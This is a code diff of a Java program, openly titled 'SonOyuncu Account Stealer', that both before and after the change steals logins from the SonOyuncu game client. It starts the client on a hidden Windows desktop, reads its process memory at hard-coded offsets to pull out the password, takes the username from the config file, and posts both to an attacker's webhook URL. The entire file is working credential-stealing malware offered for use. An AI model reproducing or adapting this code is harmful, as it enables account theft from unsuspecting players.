@@ -1,216 +1,209 @@
+import java.io.File;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
-import com.google.gson.JsonParser;
-import com.sun.jna.*;
-import com.sun.jna.platform.win32.*;
-import com.sun.jna.platform.win32.WinDef.*;
+import com.sun.jna.Memory;
+import com.sun.jna.Native;
+import com.sun.jna.Pointer;
+import com.sun.jna.platform.win32.Kernel32;
+import com.sun.jna.platform.win32.User32;
+import com.sun.jna.platform.win32.WinBase.PROCESS_INFORMATION;
+import com.sun.jna.platform.win32.WinBase.STARTUPINFO;
 import com.sun.jna.platform.win32.WinNT.HANDLE;
+//import com.sun.jna.platform.win32.WinDef.WORD; Wrong İmport :D
+import com.sun.jna.platform.win32.WinDef.WORD;
 import com.sun.jna.ptr.IntByReference;
-import com.sun.jna.win32.StdCallLibrary;
-import org.apache.http.HttpResponse;
+import com.sun.jna.win32.W32APIOptions;
+
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
-import java.io.File;
-import java.io.FileReader;
-import java.nio.charset.StandardCharsets;
-import java.util.Arrays;
-import java.util.List;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
 public class Main {
+    private static final String APPLICATION_PATH = System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncuclient.exe";
+    private static final String CONFIG_PATH = System.getenv("APPDATA") + "/.sonoyuncu/config.json";
+    private static final String WEBHOOK_URL = "UR_URL_HERE";
 
-    private static final String APP_DIR = System.getenv("APPDATA") + "\\" + ".sonoyuncu" + "\\";
-    private static final String APP_PATH = APP_DIR + "sonoyuncuclient.exe";
-    private static final String CONFIG_PATH = APP_DIR + "config.json";
-    private static final String WEBHOOK_URL = "UR_WEBHOOK_URL";
-    private static final Gson gson = new Gson();
-
-    private final Kernel32Extended kernel32 = Kernel32Extended.INSTANCE;
-    private final User32Extended user32 = User32Extended.INSTANCE;
+    private User32 user32;
+    private Kernel32 kernel32;
+    private String desktopName;
     private HANDLE hiddenDesktop;
-    private ProcessInfo processInfo;
+    private PROCESS_INFORMATION processInfo;
+
+    public interface ExtendedUser32 extends User32 {
+        ExtendedUser32 INSTANCE = Native.load("user32", ExtendedUser32.class, W32APIOptions.DEFAULT_OPTIONS);
+        HANDLE CreateDesktopW(String desktop, String device, String deviceMode, int flags, int desiredAccess, Pointer securityAttributes);
+        boolean CloseDesktop(HANDLE hDesktop);
+    }
+
+    public interface ExtendedKernel32 extends Kernel32 {
+        ExtendedKernel32 INSTANCE = Native.load("kernel32", ExtendedKernel32.class, W32APIOptions.DEFAULT_OPTIONS);
+        boolean CreateProcessW(String lpApplicationName, String lpCommandLine, Pointer lpProcessAttributes, Pointer lpThreadAttributes, boolean bInheritHandles, int dwCreationFlags, Pointer lpEnvironment, String lpCurrentDirectory, STARTUPINFO lpStartupInfo, PROCESS_INFORMATION lpProcessInformation);
+    }
+
+    public Main() {
+        this.kernel32 = ExtendedKernel32.INSTANCE;
+        this.user32 = ExtendedUser32.INSTANCE;
+        this.desktopName = "HiddenDesktop";
+        this.hiddenDesktop = null;
+        this.processInfo = null;
+    }
+
+    private PROCESS_INFORMATION launchApplication() {
+        STARTUPINFO startupInfo = new STARTUPINFO();
+        startupInfo.dwFlags = 0x00000001;
+        startupInfo.wShowWindow = new WORD(0);
+        startupInfo.lpDesktop = desktopName;
+
+        PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+        if (!((ExtendedKernel32) kernel32).CreateProcessW(null, APPLICATION_PATH, null, null, false, 0x08000000, null, null, startupInfo, processInfo)) {
+            ((ExtendedUser32) user32).CloseDesktop(this.hiddenDesktop);
+            return null;
+        }
+        return processInfo;
+    }
+
+    private void cleanup(int processId) {
+        try {
+            new ProcessBuilder("taskkill", "/F", "/PID", String.valueOf(processId)).start().waitFor();
+        } catch (Exception ignored) {}
+        if (processInfo != null) {
+            kernel32.CloseHandle(processInfo.hProcess);
+            kernel32.CloseHandle(processInfo.hThread);
+        }
+        if (hiddenDesktop != null) {
+            ((ExtendedUser32) user32).CloseDesktop(hiddenDesktop);
+        }
+    }
+
+    private byte[] readProcessMemory(int processId, long address, int size) {
+        IntByReference bytesRead = new IntByReference(0);
+        byte[] buffer = new byte[size];
+        Memory memory = new Memory(size);
+
+        HANDLE hProcess = kernel32.OpenProcess(0x0010 | 0x0020, false, processId);
+        if (hProcess != null) {
+            try {
+                if (!kernel32.ReadProcessMemory(hProcess, new Pointer(address), memory, size, bytesRead))
+                    return null;
+                memory.read(0, buffer, 0, size);
+                return buffer;
+            } finally {
+                kernel32.CloseHandle(hProcess);
+            }
+        }
+        return null;
+    }
+
+    private long getModuleBaseAddress(int processId) {
+        try {
+            Process process = new ProcessBuilder("powershell",
+                    "-Command",
+                    "$m = (Get-Process -Id " + processId + ").Modules | Where-Object { $_.ModuleName -eq 'sonoyuncuclient.exe' }; " +
+                            "if ($m) { $m.BaseAddress.ToInt64() } else { 0 }"
+            ).start();
+
+            String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8).trim();
+            process.waitFor();
+            return Long.parseLong(output);
+        } catch (Exception e) {
+            return 0;
+        }
+    }
+
+    private String[] extractMemoryCredentials(int processId) {
+        long[] offsets = {0x1CA9B0L, 0x1CA900L, 0x1CAA00L, 0x1CA800L, 0x1CAB00L};
+        long startTime = System.currentTimeMillis();
+
+        while (System.currentTimeMillis() - startTime < 15000) {
+            long baseAddress = getModuleBaseAddress(processId);
+            if (baseAddress == 0) continue;
+
+            for (long offset : offsets) {
+                byte[] memory = readProcessMemory(processId, baseAddress + offset, 512);
+                if (memory == null) continue;
+
+                StringBuilder clean = new StringBuilder();
+                for (byte b : memory) {
+                    int value = b & 0xFF;
+                    if (value >= 32 && value <= 126) {
+                        clean.append((char) value);
+                    } else if (value == 0 && clean.length() > 0) {
+                        break;
+                    }
+                }
+
+                if (clean.length() > 0) {
+                    Matcher matcher = Pattern.compile("[A-Za-z0-9._\\-@+#$%^&*=!?~'\",\\\\|/:<>\\[\\]{}()]{3,64}").matcher(clean.toString());
+                    if (matcher.find()) {
+                        try {
+                            String json = Files.readString(Paths.get(CONFIG_PATH));
+                            String username = new Gson().fromJson(json, JsonObject.class).get("userName").getAsString();
+                            return new String[]{username, matcher.group()};
+                        } catch (IOException ignored) {}
+                    }
+                }
+            }
+
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException ignored) {}
+        }
+        return null;
+    }
+
+    public String[] extractCredentials() {
+        try {
+            this.hiddenDesktop = ((ExtendedUser32) user32).CreateDesktopW(desktopName, null, null, 0, 0x00000002 | 0x00000080 | 0x00000001 | 0x10000000, null);
+            this.processInfo = launchApplication();
+            if (this.processInfo == null) return null;
+            return extractMemoryCredentials(processInfo.dwProcessId.intValue());
+        } finally {
+            if (processInfo != null) {
+                cleanup(processInfo.dwProcessId.intValue());
+            }
+        }
+    }
+
+    private static boolean sendWebhook(String[] credentials) {
+        if (credentials == null) return false;
+
+        try (CloseableHttpClient client = HttpClients.createDefault()) {
+            HttpPost request = new HttpPost(WEBHOOK_URL);
+            String json = String.format(
+                    "{" +
+                            "\"username\": \"hrsz\"," +
+                            "\"embeds\": [{" +
+                            "\"title\": \"SonOyuncu Account Stealer\"," +
+                            "\"color\": 65505," +
+                            "\"description\": \"Username: **%s**\\nPassword: **%s**\"," +
+                            "\"thumbnail\": {\"url\": \"https://www.minotar.net/avatar/%s\"}," +
+                            "\"footer\": {\"text\": \"github.com/itzgonza\",\"icon_url\": \"https://avatars.githubusercontent.com/u/61884903\"}" +
+                            "}]}",
+                    credentials[0], credentials[1], credentials[0]
+            );
+            request.setEntity(new StringEntity(json));
+            request.setHeader("Content-Type", "application/json");
+            return client.execute(request).getStatusLine().getStatusCode() == 204;
+        } catch (Exception e) {
+            return false;
+        }
+    }
 
     public static void main(String[] args) {
-        if (new File(APP_PATH).exists()) {
-            Main extractor = new Main();
-            String[] credentials = extractor.extractAccount();
-            if (credentials==null)
-                return;
-            sendWebhook(credentials[0], credentials[1]);
-        } else {
-            System.out.println("Application not found: " + APP_PATH);
-        }
-    }
-
-    public interface User32Extended extends StdCallLibrary {
-        User32Extended INSTANCE = Native.loadLibrary("user32", User32Extended.class);
-        HANDLE CreateDesktopW(WString desktop, WString device, Pointer devmode, int flags, int access, WinBase.SECURITY_ATTRIBUTES attrs);
-        boolean CloseDesktop(HANDLE desktop);
-    }
-
-    public interface Kernel32Extended extends StdCallLibrary {
-        Kernel32Extended INSTANCE = Native.loadLibrary("kernel32", Kernel32Extended.class);
-        boolean CreateProcessW(WString appName, WString cmdLine, WinBase.SECURITY_ATTRIBUTES procAttrs, WinBase.SECURITY_ATTRIBUTES threadAttrs, boolean inheritHandles, int flags, Pointer env, WString currDir, StartupInfoEx startupInfo, ProcessInfo procInfo);
-        boolean ReadProcessMemory(HANDLE process, Pointer baseAddr, Memory buffer, int size, IntByReference bytesRead);
-        HANDLE OpenProcess(int access, boolean inherit, int pid);
-        boolean CloseHandle(HANDLE handle);
-        boolean TerminateProcess(HANDLE process, int exitCode);
-        HANDLE CreateToolhelp32Snapshot(int flags, int pid);
-        boolean Module32FirstW(HANDLE snapshot, Tlhelp32.MODULEENTRY32W module);
-        boolean Module32NextW(HANDLE snapshot, Tlhelp32.MODULEENTRY32W module);
-    }
-
-    public static class StartupInfoEx extends Structure {
-        public DWORD cb = new DWORD(size());
-        public WString lpReserved, lpDesktop, lpTitle;
-        public DWORD dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
-        public WORD wShowWindow, cbReserved2;
-        public Pointer lpReserved2;
-        public HANDLE hStdInput, hStdOutput, hStdError;
-        public Pointer lpAttributeList;
-
-        @Override
-        protected List<String> getFieldOrder() {
-            return Arrays.asList("cb", "lpReserved", "lpDesktop", "lpTitle", "dwX", "dwY", "dwXSize", "dwYSize",
-                    "dwXCountChars", "dwYCountChars", "dwFillAttribute", "dwFlags", "wShowWindow",
-                    "cbReserved2", "lpReserved2", "hStdInput", "hStdOutput", "hStdError", "lpAttributeList");
-        }
-    }
-
-    public static class ProcessInfo extends Structure {
-        public HANDLE hProcess, hThread;
-        public int dwProcessId, dwThreadId;
-
-        @Override
-        protected List<String> getFieldOrder() {
-            return Arrays.asList("hProcess", "hThread", "dwProcessId", "dwThreadId");
-        }
-    }
-
-    private HANDLE createHiddenDesktop() {
-        try {
-            int access = 0x00000020 | 0x00000040 | 0x00000100 | 0x10000000;
-            return user32.CreateDesktopW(new WString("HiddenDesktop"), null, null, 0, access, null);
-        } catch (Exception ignored) {}
-        return null;
-    }
-
-    private ProcessInfo launchApp() {
-        try {
-            StartupInfoEx startup = new StartupInfoEx();
-            startup.lpDesktop = new WString("HiddenDesktop");
-            startup.dwFlags = new DWORD(0x00000001);
-            startup.wShowWindow = new WORD(0);
-            ProcessInfo procInfo = new ProcessInfo();
-            boolean success = kernel32.CreateProcessW(null, new WString(APP_PATH), null, null, false, 0x08000000, null, null, startup, procInfo);
-            return success ? procInfo : null;
-        } catch (Exception ignored) {}
-        return null;
-    }
-
-    public String[] extractAccount() {
-        try {
-            hiddenDesktop = createHiddenDesktop();
-            processInfo = launchApp();
-            return processInfo != null ? readFromMemory(processInfo.dwProcessId) : null;
-        } finally {
-            cleanup();
-        }
-    }
-
-    private String[] readFromMemory(int pid) {
-        long timeout = System.currentTimeMillis() + 10000;
-        while (System.currentTimeMillis() < timeout) {
-            try {
-                HANDLE process = kernel32.OpenProcess(0x0010 | 0x0400, false, pid);
-                if (process == null) { Thread.sleep(100); continue; }
-                long baseAddr = getBaseAddress(pid);
-                if (baseAddr == 0) { kernel32.CloseHandle(process); Thread.sleep(100); continue; }
-                JsonObject json = JsonParser.parseReader(new FileReader(CONFIG_PATH)).getAsJsonObject();
-                String user = json.get("userName").getAsString();
-                String pass = extractWithRegex(process, baseAddr + 0x1C6900, 100, "[A-Za-z0-9._\\-@+#$%^&*=!?~'\",\\\\|/:<>\\[\\]{}()]{1,128}");
-                kernel32.CloseHandle(process);
-                if (user != null && pass != null) return new String[]{user, pass};
-            } catch (Exception ignored) {}
-        }
-        return null;
-    }
-
-    private String extractWithRegex(HANDLE process, long address, int size, String regex) {
-        try {
-            Memory buffer = new Memory(size);
-            IntByReference read = new IntByReference();
-            if (kernel32.ReadProcessMemory(process, new Pointer(address), buffer, size, read) && read.getValue() > 0) {
-                String data = new String(buffer.getByteArray(0, read.getValue()), StandardCharsets.UTF_8).replace("\0", "");
-                Matcher matcher = Pattern.compile(regex).matcher(data);
-                return matcher.find() ? matcher.group() : null;
+        if (new File(APPLICATION_PATH).exists()) {
+            Main stealer = new Main();
+            String[] creds = stealer.extractCredentials();
+            if (sendWebhook(creds)) {
+                System.out.println("successfully ~> " + creds[0] + ":" + creds[1]);
             }
-        } catch (Exception ignored) {}
-        return null;
-    }
-
-    private long getBaseAddress(int pid) {
-        try {
-            HANDLE snapshot = kernel32.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPMODULE.intValue(), pid);
-            if (snapshot == null) return 0;
-            Tlhelp32.MODULEENTRY32W module = new Tlhelp32.MODULEENTRY32W();
-            module.dwSize = new DWORD(module.size());
-            while (kernel32.Module32FirstW(snapshot, module) || kernel32.Module32NextW(snapshot, module)) {
-                if ("sonoyuncuclient.exe".equalsIgnoreCase(Native.toString(module.szModule))) {
-                    kernel32.CloseHandle(snapshot);
-                    return Pointer.nativeValue(module.modBaseAddr);
-                }
-            }
-            kernel32.CloseHandle(snapshot);
-            return 0;
-        } catch (Exception ignored) {}
-        return 0;
-    }
-
-    private void cleanup() {
-        try {
-            if (processInfo != null) {
-                HANDLE proc = kernel32.OpenProcess(0x0001, false, processInfo.dwProcessId);
-                if (proc != null) {
-                    kernel32.TerminateProcess(proc, 0);
-                    kernel32.CloseHandle(proc);
-                }
-                kernel32.CloseHandle(processInfo.hProcess);
-                kernel32.CloseHandle(processInfo.hThread);
-            }
-            if (hiddenDesktop != null) user32.CloseDesktop(hiddenDesktop);
-        } catch (Exception ignored) {}
-    }
-
-    public static boolean sendWebhook(String username, String password) {
-        try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
-            JsonObject payload = new JsonObject();
-            payload.addProperty("username", "fantasy");
-            JsonObject embed = new JsonObject();
-            embed.addProperty("title", "SonOyuncu Account Stealer :dash:");
-            embed.addProperty("color", 65505);
-            embed.addProperty("description",
-                    "a new bait has been spotted :woozy_face:\n\n" +
-                            ":small_blue_diamond:Username **" + username + "**\n" +
-                            ":small_blue_diamond:Password **" + password + "**");
-            JsonObject thumbnail = new JsonObject();
-            thumbnail.addProperty("url", "https://www.minotar.net/avatar/" + username);
-            embed.add("thumbnail", thumbnail);
-            JsonObject footer = new JsonObject();
-            footer.addProperty("text", "github.com/fantasywastaken");
-            footer.addProperty("icon_url", "https://avatars.githubusercontent.com/u/61884903");
-            embed.add("footer", footer);
-            JsonObject[] embeds = {embed};
-            payload.add("embeds", gson.toJsonTree(embeds));
-            HttpPost httpPost = new HttpPost(WEBHOOK_URL);
-            httpPost.setHeader("Content-Type", "application/json");
-            httpPost.setEntity(new StringEntity(gson.toJson(payload)));
-            HttpResponse response = httpClient.execute(httpPost);
-            return response.getStatusLine().getStatusCode() == 204;
-        } catch (Exception ignored) {}
-        return false;
+        }
     }
 }
